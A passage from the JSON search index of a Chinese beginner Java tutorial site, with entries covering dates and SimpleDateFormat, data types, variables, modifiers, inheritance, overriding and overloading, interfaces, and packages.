日期比较 #  Java 使用以下三种方法来比较两个日期：\n 使用 getTime() 方法获取两个日期（自1970年1月1日经历的毫秒数值），然后比较这两个值。 使用方法 before()，after() 和 equals()。例如，一个月的12号比18号早，则 new Date(99, 2, 12).before(new Date (99, 2, 18)) 返回 true。 使用 compareTo() 方法，它是由 Comparable 接口定义的，Date 类实现了这个接口。  使用 SimpleDateFormat 格式化日期 #  SimpleDateFormat 是一个以语言环境敏感的方式来格式化和分析日期的类。SimpleDateFormat 允许你选择任何用户自定义日期时间格式来运行。例如：\nimport java.util.*; import java.text.*; public class DateDemo { public static void main(String args[]) { Date dNow = new Date( ); SimpleDateFormat ft = new SimpleDateFormat (\u0026#34;yyyy-MM-dd hh:mm:ss\u0026#34;); System.out.println(\u0026#34;当前时间为: \u0026#34; + ft.format(dNow)); } } 日期和时间的格式化编码 #  时间模式字符串用来指定时间格式。在此模式中，所有的 ASCII 字母被保留为模式字母，定义如下：\n   字母 描述 示例     G 纪元标记 AD   y 四位年份 2001   M 月份 July or 07   d 一个月的日期 10   h A.M./P.M. (1~12)格式小时 12   H 一天中的小时 (0~23) 22   m 分钟数 30   s 秒数 55   S 毫秒数 234   E 星期几 Tuesday   D 一年中的日子 360   F 一个月中第几周的周几 2 (second Wed. in July)   w 一年中第几周 40   W 一个月中第几周 1   a A.M./P.M. 标记 PM   k 一天中的小时(1~24) 24   K A.M./P.M. (0~11)格式小时 10   z 时区 Eastern Standard Time   ' 文字定界符 Delimiter   \u0026quot; 单引号 `    使用 printf 格式化日期 #  printf 方法可以很轻松地格式化时间和日期。使用两个字母格式，它以 %t 开头并且以下面表格中的一个字母结尾。\n   转 换 符 说 明 示 例     c 包括全部日期和时间信息 星期六 十月 27 14:21:20 CST 2007   F \u0026ldquo;年-月-日\u0026quot;格式 2007-10-27   D \u0026ldquo;月/日/年\u0026quot;格式 10/27/07   r \u0026ldquo;HH:MM:SS PM\u0026quot;格式（12时制） 02:25:51 下午   T \u0026ldquo;HH:MM:SS\u0026quot;格式（24时制） 14:28:16   R \u0026ldquo;HH:MM\u0026quot;格式（24时制） 14:28    更多 printf 解析可以参见：Java 格式化输出 printf 例子\n解析字符串为时间 #  SimpleDateFormat 类有一些附加的方法，特别是 parse()，它试图按照给定的 SimpleDateFormat 对象的格式化存储来解析字符串。例如：\nimport java.util.*; import java.text.*; public class DateDemo { public static void main(String args[]) { SimpleDateFormat ft = new SimpleDateFormat (\u0026#34;yyyy-MM-dd\u0026#34;); String input = args.length == 0 ? \u0026#34;1818-11-11\u0026#34; : args[0]; System.out.print(input + \u0026#34; Parses as \u0026#34;); Date t; try { t = ft.parse(input); System.out.println(t); } catch (ParseException e) { System.out.println(\u0026#34;Unparseable using \u0026#34; + ft); } } } JAVA 休眠 #  sleep() 使当前线程进入停滞状态（阻塞当前线程），让出 CPU 的使用、目的是不让当前线程独自霸占该进程所获的 CPU 资源，以留一定时间给其他线程执行的机会。\n你可以让程序休眠一毫秒的时间或者到您的计算机的寿命长的任意段时间。例如，下面的程序会休眠 3 秒：\nimport java.util.*; public class SleepDemo { public static void main(String args[]) { try { System.out.println(new Date( ) + \u0026#34;\\n\u0026#34;); Thread.sleep(1000*3); // 休眠3秒  System.out.println(new Date( ) + \u0026#34;\\n\u0026#34;); } catch (Exception e) { System.out.println(\u0026#34;Got an exception!\u0026#34;); } } } 测量时间 #  下面的一个例子表明如何测量时间间隔（以毫秒为单位）：\nimport java.util.*; public class DiffDemo { public static void main(String args[]) { try { long start = System.currentTimeMillis( ); System.out.println(new Date( ) + \u0026#34;\\n\u0026#34;); Thread.sleep(5*60*10); System.out.println(new Date( ) + \u0026#34;\\n\u0026#34;); long end = System.currentTimeMillis( ); long diff = end - start; System.out.println(\u0026#34;Difference is : \u0026#34; + diff); } catch (Exception e) { System.out.println(\u0026#34;Got an exception!\u0026#34;); } } } Calendar #  Calendar类的功能要比Date类强大很多，而且在实现方式上也比Date类要复杂一些。\nCalendar 类是一个抽象类，在实际使用时实现特定的子类的对象，创建对象的过程对程序员来说是透明的，只需要使用 getInstance 方法创建即可。\n创建对象 #  当前日期的对象：\nCalendar c = Calendar.getInstance(); //默认是当前日期 创建一个指定日期的对象：\n// 创建一个代表 2009 年 6 月 12 日的 Calendar 对象 Calendar c1 = Calendar.getInstance(); c1.set(2009, 6 - 1, 12); 对象字段类型 #  Calendar 类中用以下这些常量表示不同的意义，jdk 内的很多类其实都是采用的这种思想\n   常量 描述     Calendar.YEAR 年份   Calendar.MONTH 月份   Calendar.DATE 日期   Calendar.DAY_OF_MONTH 日期，和上面的字段意义完全相同   Calendar.HOUR 12小时制的小时   Calendar.HOUR_OF_DAY 24小时制的小时   Calendar.MINUTE 分钟   Calendar.SECOND 秒   Calendar.DAY_OF_WEEK 星期几    对象类型的设置 #  set 方法的两个函数原型：\npublic final void set(int year,int month,int date); public void set(int field,int value); 还可以使用 add 方法，示例代码如下：\nc1.set(Calendar.DATE,10); // 把 c1 对象代表的日期设置为 10 号，其它所有的数值会被重新计算 GregorianCalendar 类 #  Calendar 类实现了公历日历，GregorianCalendar 是 Calendar 类的一个具体实现。\nCalendar 的 getInstance() 方法返回一个默认用当前的语言环境和时区初始化的 GregorianCalendar 对象。GregorianCalendar 定义了两个字段：AD 和 BC。这是代表公历定义的两个时代。\n"},{"id":300,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/15.%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/","title":"15.正则表达式","section":"菜鸟基础教程","content":"正则表达式 #  java.util.regex 包主要包括以下三个类：\n  Pattern 类：\npattern 对象是一个正则表达式的编译表示。Pattern 类没有公共构造方法。要创建一个 Pattern 对象，你必须首先调用其公共静态编译方法，它返回一个 Pattern 对象。该方法接受一个正则表达式作为它的第一个参数。\n  Matcher 类：\nMatcher 对象是对输入字符串进行解释和匹配操作的引擎。与Pattern 类一样，Matcher 也没有公共构造方法。你需要调用 Pattern 对象的 matcher 方法来获得一个 Matcher 对象。\n  PatternSyntaxException：\nPatternSyntaxException 是一个非强制异常类，它表示一个正则表达式模式中的语法错误。\n  "},{"id":301,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/2.%E5%AF%B9%E8%B1%A1%E5%92%8C%E7%B1%BB/","title":"2.对象和类","section":"菜鸟基础教程","content":"对象和类 #  Java作为一种面向对象语言。支持以下基本概念：多态、继承、封装、抽象、类、对象、实例、方法、重载。\n构造方法，成员定义调用等，均与 C++ 类似。\n源文件声明规则 #  在本节的最后部分，我们将学习源文件的声明规则。当在一个源文件中定义多个类，并且还有 import 语句和package语句时，要特别注意这些规则。\n 一个源文件中只能有一个 public 类 一个源文件可以有多个非 public 类 源文件的名称应该和 public 类的类名保持一致。例如：源文件中 public 类的类名是 Employee，那么源文件应该命名为 Employee.java。 如果一个类定义在某个包中，那么 package 语句应该在源文件的首行。 如果源文件包含 import 语句，那么应该放在 package 语句和类定义之间。如果没有 package 语句，那么 import 语句应该在源文件中最前面。 import 语句和 package 语句对源文件中定义的所有类都有效。在同一源文件中，不能给不同的类不同的包声明。  类有若干种访问级别，并且类也分不同的类型：抽象类和 final 类等。这些将在访问控制章节介绍。\n除了上面提到的几种类型，Java还有一些特殊的类，如：内部类、匿名类。\nJAVA包 #  Import 语句 #  在Java中，如果给出一个完整的限定名，包括包名、类名，那么Java编译器就可以很容易地定位到源代码或者类。Import语句就是用来提供一个合理的路径，使得编译器可以找到某个类。\n例如，下面的命令行将会命令编译器载入 java_installation/java/io 路径下的所有类\nimport java.io.*; "},{"id":302,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/","title":"3.基本数据类型","section":"菜鸟基础教程","content":"基本数据类型 #  Java 的两大数据类型:\n 内置数据类型 引用数据类型  内置数据类型 #  Java语言提供了八种基本类型。六种数字类型（四个整数型，两个浮点型），一种字符类型，还有一种布尔型。\nbyte：\n byte 数据类型是8位、有符号的，以二进制补码表示的整数； 最小值是 -128（-2^7）； 最大值是 127（2^7-1）； 默认值是 0； byte 类型用在大型数组中节约空间，主要代替整数，因为 byte 变量占用的空间只有 int 类型的四分之一； 例子：byte a = 100，byte b = -50。  short：\n short 数据类型是 16 位、有符号的以二进制补码表示的整数 最小值是 -32768（-2^15）； 最大值是 32767（2^15 - 1）； Short 数据类型也可以像 byte 那样节省空间。一个short变量是int型变量所占空间的二分之一； 默认值是 0； 例子：short s = 1000，short r = -20000。  int：\n int 数据类型是32位、有符号的以二进制补码表示的整数； 最小值是 -2,147,483,648（-2^31）； 最大值是 2,147,483,647（2^31 - 1）； 一般地整型变量默认为 int 类型； 默认值是 0 ； 例子：int a = 100000, int b = -200000。  long：\n long 数据类型是 64 位、有符号的以二进制补码表示的整数； 最小值是 -9,223,372,036,854,775,808（-2^63）； 最大值是 9,223,372,036,854,775,807（2^63 -1）； 这种类型主要使用在需要比较大整数的系统上； 默认值是 0L； 例子： long a = 100000L，Long b = -200000L。 \u0026ldquo;L\u0026quot;理论上不分大小写，但是若写成\u0026quot;l\u0026quot;容易与数字\u0026quot;1\u0026quot;混淆，不容易分辩。所以最好大写。  float：\n float 数据类型是单精度、32位、符合IEEE 754标准的浮点数； float 在储存大型浮点数组的时候可节省内存空间； 默认值是 0.0f； 浮点数不能用来表示精确的值，如货币； 例子：float f1 = 234.5f。  double：\n double 数据类型是双精度、64 位、符合IEEE 754标准的浮点数； 浮点数的默认类型为double类型； double类型同样不能表示精确的值，如货币； 默认值是 0.0d； 例子：double d1 = 123.4。  boolean：\n boolean数据类型表示一位的信息； 只有两个取值：true 和 false； 这种类型只作为一种标志来记录 true/false 情况； 默认值是 false； 例子：boolean one = true。  char：\n char类型是一个单一的 16 位 Unicode 字符； 最小值是 \\u0000（即为0）； 最大值是 \\uffff（即为65,535）； char 数据类型可以储存任何字符； 例子：char letter = \u0026lsquo;A\u0026rsquo;;。  对于数值类型的基本类型的取值范围，我们无需强制去记忆，因为它们的值都已经以常量的形式定义在对应的包装类中了。请看下面的例子：\npublic class PrimitiveTypeTest { public static void main(String[] args) { // byte  System.out.println(\u0026#34;基本类型：byte 二进制位数：\u0026#34; + Byte.SIZE); System.out.println(\u0026#34;包装类：java.lang.Byte\u0026#34;); System.out.println(\u0026#34;最小值：Byte.MIN_VALUE=\u0026#34; + Byte.MIN_VALUE); System.out.println(\u0026#34;最大值：Byte.MAX_VALUE=\u0026#34; + Byte.MAX_VALUE); System.out.println(); ... } } 引用数据类型 #    在 Java 中，引用类型的变量非常类似于 C/C++ 的指针。引用类型指向一个对象，指向对象的变量是引用变量。这些变量在声明时被指定为一个特定的类型，比如 Employee、Puppy 等。变量一旦声明后，类型就不能被改变了。\n  对象、数组都是引用数据类型。\n  所有引用类型的默认值都是 null。\n  一个引用变量可以用来引用任何与之兼容的类型。\n  例子：\nSite site = new Site(\u0026#34;Runoob\u0026#34;);   Java 常量 #  常量在程序运行时是不能被修改的。\n在 Java 中使用 final 关键字来修饰常量，声明方式和变量类似：\nfinal double PI = 3.1415927; 虽然常量名也可以用小写，但为了便于识别，通常使用大写字母表示常量。\n字面量可以赋给任何内置类型的变量。例如：\nbyte a = 68; char a = \u0026#39;A\u0026#39;; byte、int、long、和 short 都可以用十进制、16 进制以及 8 进制的方式来表示。\n当使用常量的时候，前缀 0 表示 8 进制，而前缀 0x 代表 16 进制, 例如：\nint decimal = 100; int octal = 0144; int hexa = 0x64; 和其他语言一样，Java的字符串常量也是包含在两个引号之间的字符序列。下面是字符串型字面量的例子：\n\u0026#34;Hello World\u0026#34; \u0026#34;two\\nlines\u0026#34; \u0026#34;\\\u0026#34;This is in quotes\\\u0026#34;\u0026#34; 字符串常量和字符常量都可以包含任何Unicode字符。例如：\nchar a = \u0026#39;\\u0001\u0026#39;; String a = \u0026#34;\\u0001\u0026#34;; Java语言支持一些特殊的转义字符序列。\n   符号 字符含义     \\n 换行 (0x0a)   \\r 回车 (0x0d)   \\f 换页符(0x0c)   \\b 退格 (0x08)   \\0 空字符 (0x20)   \\s 字符串   \\t 制表符   \\\u0026quot; 双引号   \\' 单引号   \\\\ 反斜杠   \\ddd 八进制字符 (ddd)   \\uxxxx 16进制Unicode字符 (xxxx)    自动类型转换 #  整型、实型（常量）、字符型数据可以混合运算。运算中，不同类型的数据先转化为同一类型，然后进行运算。\n转换从低级到高级。\n低 ------------------------------------\u0026gt; 高 byte,short,char—\u0026gt; int —\u0026gt; long—\u0026gt; float —\u0026gt; double 数据类型转换必须满足如下规则：\n  不能对 boolean 类型进行类型转换。\n  不能把对象类型转换成不相关类的对象。\n  在把容量大的类型转换为容量小的类型时必须使用强制类型转换。\n  转换过程中可能导致溢出或损失精度，例如：\nint i =128; byte b = (byte)i; 因为 byte 类型是 8 位，最大值为127，所以当 int 强制转换为 byte 类型时，值 128 时候就会导致溢出。\n  浮点数到整数的转换是通过舍弃小数得到，而不是四舍五入，例如：\n(int)23.7 == 23; (int)-45.89f == -45;   三种类型转换：自动类型转换、强制类型转换、隐含强制类型转换。\n"},{"id":303,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/4.%E5%8F%98%E9%87%8F%E7%B1%BB%E5%9E%8B/","title":"4.变量类型","section":"菜鸟基础教程","content":"变量类型 #  在 Java 语言中，所有的变量在使用前必须声明。声明变量的基本格式如下：\ntype identifier [ = value][, identifier [= value] ...] ; Java 语言支持的变量类型有：\n 类变量：独立于方法之外的变量，用 static 修饰。 实例变量：独立于方法之外的变量，不过没有 static 修饰。 局部变量：类的方法中的变量。  Java 局部变量 #   局部变量声明在方法、构造方法或者语句块中； 局部变量在方法、构造方法、或者语句块被执行的时候创建，当它们执行完成后，变量将会被销毁； 访问修饰符不能用于局部变量； 局部变量只在声明它的方法、构造方法或者语句块中可见； 局部变量是在栈上分配的。 局部变量没有默认值，所以局部变量被声明后，必须经过初始化，才可以使用。  Java 实例变量 #   实例变量声明在一个类中，但在方法、构造方法和语句块之外； 当一个对象被实例化之后，每个实例变量的值就跟着确定； 实例变量在对象创建的时候创建，在对象被销毁的时候销毁； 实例变量的值应该至少被一个方法、构造方法或者语句块引用，使得外部能够通过这些方式获取实例变量信息； 实例变量可以声明在使用前或者使用后； 访问修饰符可以修饰实例变量； 实例变量对于类中的方法、构造方法或者语句块是可见的。一般情况下应该把实例变量设为私有。通过使用访问修饰符可以使实例变量对子类可见； 实例变量具有默认值。数值型变量的默认值是 0，布尔型变量的默认值是 false，引用类型变量的默认值是 null。变量的值可以在声明时指定，也可以在构造方法中指定； 实例变量可以直接通过变量名访问。但在静态方法以及其他类中，就应该使用完全限定名：ObejectReference.VariableName。  类变量（静态变量） #   类变量也称为静态变量，在类中以 statiic 关键字声明，但必须在方法构造方法和语句块之外。 无论一个类创建了多少个对象，类只拥有类变量的一份拷贝。 静态变量除了被声明为常量外很少使用。常量是指声明为 public/private，final 和 static 类型的变量。常量初始化后不可改变。 静态变量储存在静态存储区。经常被声明为常量，很少单独使用 static 声明变量。 静态变量在第一次被访问时创建，在程序结束时销毁。 与实例变量具有相似的可见性。但为了对类的使用者可见，大多数静态变量声明为 public 类型。 默认值和实例变量相似。数值型变量默认值是 0，布尔型默认值是 false，引用类型默认值是 null。变量的值可以在声明的时候指定，也可以在构造方法中指定。此外，静态变量还可以在静态语句块中初始化。 静态变量可以通过：ClassName.VariableName 的方式访问。 类变量被声明为 public static final 类型时，类变量名称一般建议使用大写字母。如果静态变量不是 public 和 final 类型，其命名方式与实例变量以及局部变量的命名方式一致。  "},{"id":304,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/5.%E4%BF%AE%E9%A5%B0%E7%AC%A6/","title":"5.修饰符","section":"菜鸟基础教程","content":"修饰符 #  访问修饰符 #  Java中，可以使用访问控制符来保护对类、变量、方法和构造方法的访问。Java 支持 4 种不同的访问权限。\n default (即缺省，什么也不写）: 在同一包内可见，不使用任何修饰符。使用对象：类、接口、变量、方法。 private : 在同一类内可见。使用对象：变量、方法。 注意：不能修饰类（外部类） public : 对所有类可见。使用对象：类、接口、变量、方法 protected : 对同一包内的类和所有子类可见。使用对象：变量、方法。 注意：不能修饰类（外部类）。  我们可以通过以下表来说明访问权限：\n   修饰符 当前类 同一包内 子孙类(同一包) 子孙类(不同包) 其他包     public Y Y Y Y Y   protected Y Y Y Y/N（说明） N   default Y Y Y N N   private Y N N N N    非访问修饰符 #  为了实现一些其他的功能，Java 也提供了许多非访问修饰符。\n  static 修饰符，用来修饰类方法和类变量。\n  final 修饰符，用来修饰类、方法和变量，final 修饰的类不能够被继承，修饰的方法不能被继承类重新定义，修饰的变量为常量，是不可修改的。\n  abstract 修饰符，用来创建抽象类和抽象方法。\n  synchronized 和 volatile 修饰符，主要用于线程的编程。\n  "},{"id":305,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/6.%E8%BF%90%E7%AE%97%E7%AC%A6/","title":"6.运算符","section":"菜鸟基础教程","content":"运算符 #  http://www.runoob.com/java/java-operators.html\n"},{"id":306,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/7.%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84/","title":"7.循环结构","section":"菜鸟基础教程","content":"循环结构 #  http://www.runoob.com/java/java-loop.html\n"},{"id":307,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/8.%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5/","title":"8.条件语句","section":"菜鸟基础教程","content":"条件语句 #  http://www.runoob.com/java/java-if-else-switch.html\n"},{"id":308,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/9.number%E5%92%8Cmath%E7%B1%BB/","title":"9. Number和 Math类","section":"菜鸟基础教程","content":"Number #  所有的包装类**（Integer、Long、Byte、Double、Float、Short）**都是抽象类 Number 的子类，如下图：\n这种由编译器特别支持的包装称为装箱，所以当内置数据类型被当作对象使用的时候，编译器会把内置类型装箱为包装类。相似的，编译器也可以把一个对象拆箱为内置类型。Number 类属于 java.lang 包。\nMath 类 #  Java 的 Math 包含了用于执行基本数学运算的属性和方法，如初等指数、对数、平方根和三角函数。\nMath 的方法都被定义为 static 形式，通过 Math 类可以在主函数中直接调用。\n下面的表中列出的是 Number \u0026amp; Math 类常用的一些方法：http://www.runoob.com/java/java-number.html\n"},{"id":309,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/java/%E8%8F%9C%E9%B8%9F%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/1.%E7%BB%A7%E6%89%BF/","title":"1.继承","section":"菜鸟面向对象","content":"继承 #  类的继承格式 #  在 Java 中通过 extends 关键字可以申明一个类是从另外一个类继承而来的，一般形式如下：\nclass 父类 { } class 子类 extends 父类 { } 继承类型 #  需要注意的是 Java 不支持多继承，但支持多重继承：\n继承的特性 #   子类拥有父类非 private 的属性、方法。 子类可以拥有自己的属性和方法，即子类可以对父类进行扩展。 子类可以用自己的方式实现父类的方法。 Java 的继承是单继承，但是可以多重继承，单继承就是一个子类只能继承一个父类，多重继承就是，例如 A 类继承 B 类，B 类继承 C 类，所以按照关系就是 C 类是 B 类的父类，B 类是 A 类的父类，这是 Java 继承区别于 C++ 继承的一个特性。 提高了类之间的耦合性（继承的缺点，耦合度高就会造成代码之间的联系越紧密，代码独立性越差）。  继承关键字 #  继承可以使用 extends 和 implements 这两个关键字来实现继承，而且所有的类都是继承于 java.lang.Object，当一个类没有继承的两个关键字，则默认继承object（这个类在 java.lang 包中，所以不需要 import）祖先类。\nextends #  在 Java 中，类的继承是单一继承，也就是说，一个子类只能拥有一个父类，所以 extends 只能继承一个类：\npublic class Animal { private String name; private int id; public Animal(String myName, String myid) { //初始化属性值  } public void eat() { //吃东西方法的具体实现 }  public void sleep() { //睡觉方法的具体实现 } } public class Penguin extends Animal{ } implements #  使用 implements 关键字可以变相的使 java 具有多继承的特性，使用范围为类继承接口的情况，可以同时继承多个接口（接口跟接口之间采用逗号分隔）。\npublic interface A { public void eat(); public void sleep(); } public interface B { public void show(); } public class C implements A,B { } super #  super 关键字：我们可以通过 super 关键字来实现对父类成员的访问，用来引用当前对象的父类。\nthis #  this 关键字：指向自己的引用。\nfinal #  final 关键字声明类可以把类定义为不能继承的，即最终类；或者用于修饰方法，该方法不能被子类重写：\n  声明类：\nfinal class 类名 { //类体 }   声明方法：\n修饰符(public/private/default/protected) final 返回值类型 方法名 () { //方法体 }   注：实例变量也可以被定义为 final，被定义为 final 的变量不能被修改。被声明为 final 类的方法自动地声明为 final，但是实例变量并不是 final\n"},{"id":310,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/java/%E8%8F%9C%E9%B8%9F%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/2.%E9%87%8D%E5%86%99%E4%B8%8E%E9%87%8D%E8%BD%BD/","title":"2.重写与重载","section":"菜鸟面向对象","content":"重写与重载 #  重写 Override #  重写是子类对父类的允许访问的方法的实现过程进行重新编写, 返回值和形参都不能改变。即外壳不变，核心重写！\n重写的好处在于子类可以根据需要，定义特定于自己的行为。 也就是说子类能够根据需要实现父类的方法。\n方法的重写规则：\n 参数列表必须完全与被重写方法的相同； 返回类型必须完全与被重写方法的返回类型相同； 访问权限不能比父类中被重写的方法的访问权限更低。例如：如果父类的一个方法被声明为 public，那么在子类中重写该方法就不能声明为 protected。 父类的成员方法只能被它的子类重写。 声明为 final 的方法不能被重写。 声明为 static 的方法不能被重写，但是能够被再次声明。 子类和父类在同一个包中，那么子类可以重写父类所有方法，除了声明为 private 和 final 的方法。 子类和父类不在同一个包中，那么子类只能够重写父类的声明为 public 和 protected 的非 final 方法。 重写的方法能够抛出任何非强制异常，无论被重写的方法是否抛出异常。但是，重写的方法不能抛出新的强制性异常，或者比被重写方法声明的更广泛的强制性异常，反之则可以。 构造方法不能被重写。 如果不能继承一个方法，则不能重写这个方法。  NOTICE: 当需要在子类中调用父类的被重写方法时，要使用 super 关键字。\n重载 Overload #  重载 (overloading) 是在一个类里面，方法名字相同，而参数不同。返回类型可以相同也可以不同。\n每个重载的方法（或者构造函数）都必须有一个独一无二的参数类型列表。\n最常用的地方就是构造器的重载。\n规则：\n 被重载的方法必须改变参数列表(参数个数或类型不一样)； 被重载的方法可以改变返回类型； 被重载的方法可以改变访问修饰符； 被重载的方法可以声明新的或更广的检查异常； 方法能够在同一个类中或者在一个子类中被重载。 无法以返回值类型作为重载函数的区分标准。  "},{"id":311,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/java/%E8%8F%9C%E9%B8%9F%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/3.%E5%A4%9A%E6%80%81/","title":"3.多态","section":"菜鸟面向对象","content":"多态 #  http://www.runoob.com/java/java-polymorphism.html\n"},{"id":312,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/java/%E8%8F%9C%E9%B8%9F%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/4.%E6%8A%BD%E8%B1%A1%E7%B1%BB/","title":"4.抽象类","section":"菜鸟面向对象","content":"抽象类 #  http://www.runoob.com/java/java-abstraction.html\n"},{"id":313,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/java/%E8%8F%9C%E9%B8%9F%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/5.%E5%B0%81%E8%A3%85/","title":"5.封装","section":"菜鸟面向对象","content":"封装 #  http://www.runoob.com/java/java-encapsulation.html\n"},{"id":314,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/java/%E8%8F%9C%E9%B8%9F%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/6.%E6%8E%A5%E5%8F%A3/","title":"6.接口","section":"菜鸟面向对象","content":"接口 #  接口（英文：Interface），在 JAVA 编程语言中是一个抽象类型，是抽象方法的集合，接口通常以 interface 来声明。一个类通过继承接口的方式，从而来继承接口的抽象方法。\n  接口并不是类，编写接口的方式和类很相似，但是它们属于不同的概念。类描述对象的属性和方法。接口则包含类要实现的方法。\n  除非实现接口的类是抽象类，否则该类要定义接口中的所有方法。\n  接口无法被实例化，但是可以被实现。一个实现接口的类，必须实现接口内所描述的所有方法，否则就必须声明为抽象类。\n  另外，在 Java 中，接口类型可用来声明一个变量，他们可以成为一个空指针，或是被绑定在一个以此接口实现的对象。\n  接口特性：\n  接口中每一个方法也是隐式抽象的,接口中的方法会被隐式的指定为 public abstract（只能是 public abstract，其他修饰符都会报错）。\n  接口中可以含有变量，但是接口中的变量会被隐式的指定为 public static final 变量（并且只能是 public，用 private 修饰会报编译错误）。\n  接口中的方法是不能在接口中实现的，只能由实现接口的类来实现接口中的方法。\n  抽象类和接口的区别：\n  抽象类中的方法可以有方法体，就是能实现方法的具体功能，但是接口中的方法不行。\n  抽象类中的成员变量可以是各种类型的，而接口中的成员变量只能是 public static final 类型的。\n  接口中不能含有静态代码块以及静态方法(用 static 修饰的方法)，而抽象类是可以有静态代码块和静态方法。\n  一个类只能继承一个抽象类，而一个类却可以实现多个接口。\n  声明 #  接口的声明语法格式如下：\n[可见度] interface 接口名称 [extends 其他的接口名名] { // 声明变量  // 抽象方法 }  接口是隐式抽象的，当声明一个接口的时候，不必使用 abstract 关键字。 接口中每一个方法也是隐式抽象的，声明时同样不需要 abstract 关键字。 接口中的方法都是公有的。  实现 #  当类实现接口的时候，类要实现接口中所有的方法。否则，类必须声明为抽象的类。\n类使用 implements 关键字实现接口。在类声明中，Implements 关键字放在 class 声明后面。\n实现一个接口的语法，可以使用这个公式：\n...implements 接口名称[, 其他接口名称, 其他接口名称..., ...] ... 重写接口中声明的方法时，需要注意以下规则：\n 类在实现接口的方法时，不能抛出强制性异常，只能在接口中，或者继承接口的抽象类中抛出该强制性异常。 类在重写方法时要保持一致的方法名，并且应该保持相同或者相兼容的返回值类型。 如果实现接口的类是抽象类，那么就没必要实现该接口的方法。  在实现接口的时候，也要注意一些规则：\n 一个类可以同时实现多个接口。 一个类只能继承一个类，但是能实现多个接口。 一个接口能继承另一个接口，这和类之间的继承比较相似。  标记接口 #  最常用的继承接口是没有包含任何方法的接口。\n标记接口是没有任何方法和属性的接口.它仅仅表明它的类属于一个特定的类型,供其他代码来测试允许做一些事情。\n标记接口作用：简单形象的说就是给某个对象打个标（盖个戳），使对象拥有某个或某些特权。\n例如：java.awt.event 包中的 MouseListener 接口继承的 java.util.EventListener 接口定义如下：\npackage java.util; public interface EventListener {} 没有任何方法的接口被称为标记接口。标记接口主要用于以下两种目的：\n 建立一个公共的父接口：正如 EventListener 接口，这是由几十个其他接口扩展的 Java API，你可以使用一个标记接口来建立一组接口的父接口。例如：当一个接口继承了 EventListener 接口，Java 虚拟机 (JVM) 就知道该接口将要被用于一个事件的代理方案。 向一个类添加数据类型：这种情况是标记接口最初的目的，实现标记接口的类不需要定义任何接口方法（因为标记接口根本就没有方法），但是该类通过多态性变成一个接口类型。  "},{"id":315,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/java/%E8%8F%9C%E9%B8%9F%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/7.%E5%8C%85/","title":"7.包","section":"菜鸟面向对象","content":"包 (package) #  为了更好地组织类，Java 提供了包机制，用于区别类名的命名空间。\n包的作用：\n  把功能相似或相关的类或接口组织在同一个包中，方便类的查找和使用。\n  如同文件夹一样，包也采用了树形目录的存储方式。同一个包中的类名字是不同的，不同的包中的类的名字是可以相同的，当同时调用两个不同包中相同类名的类时，应该加上包名加以区别。因此，包可以避免名字冲突。\n  包也限定了访问权限，拥有包访问权限的类才能访问某个包中的类。\n  Java 使用包（package）这种机制是为了防止命名冲突，访问控制，提供搜索和定位类（class）、接口、枚举（enumerations）和注释（annotation）等。\n包语句的语法格式为：\npackage pkg1[．pkg2[．pkg3…]]; 一个包（package）可以定义为一组相互联系的类型（类、接口、枚举和注释），为这些类型提供访问保护和命名空间管理的功能。\n以下是一些 Java 中的包：\n java.lang-打包基础的类 java.io-包含输入输出功能的函数  package 目录结构 #  类放在包中会有两种主要的结果：\n 包名成为类名的一部分，正如我们前面讨论的一样。 包名必须与相应的字节码所在的目录结构相吻合。  例如：有一个 com.runoob.test 的包，这个包包含一个叫做 Runoob.java 的源文件，那么相应的，应该有如下面的一连串子目录：\n....\\com\\runoob\\test\\Runoob.java 